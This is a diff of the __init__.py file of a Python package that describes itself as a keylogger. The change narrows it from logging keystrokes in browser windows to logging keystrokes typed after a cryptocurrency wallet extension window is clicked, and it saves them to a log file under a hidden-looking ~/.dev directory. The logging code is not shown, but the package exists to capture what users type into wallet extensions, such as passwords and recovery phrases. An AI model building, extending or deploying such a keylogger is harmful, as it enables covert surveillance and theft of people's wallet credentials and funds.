@@ -1,20 +1,19 @@
 """
-浏览器键盘记录器包 (Browser Keylogger Package)
+钱包键盘记录器包 (Wallet Keylogger Package)
 
-仅监控浏览器窗口的键盘输入，记录到 ~/.dev/keylogger_{时间戳}.log
+点击钱包扩展窗口后触发键盘记录，记录到 ~/.dev/bkler/recording_{日期}.log
 """
 
-__version__ = "0.1.5"
+__version__ = "0.2.0"
 __author__ = "YLX-STUDIO"
 
 from .logger import KeyLogger, create_log_file
-from .detectors import get_active_window_name, is_browser_active, is_wsl
+from .detectors import get_active_window_name, is_wallet_window
 
 __all__ = [
     "__version__",
     "KeyLogger",
     "create_log_file",
     "get_active_window_name",
-    "is_browser_active",
-    "is_wsl",
+    "is_wallet_window",
 ]
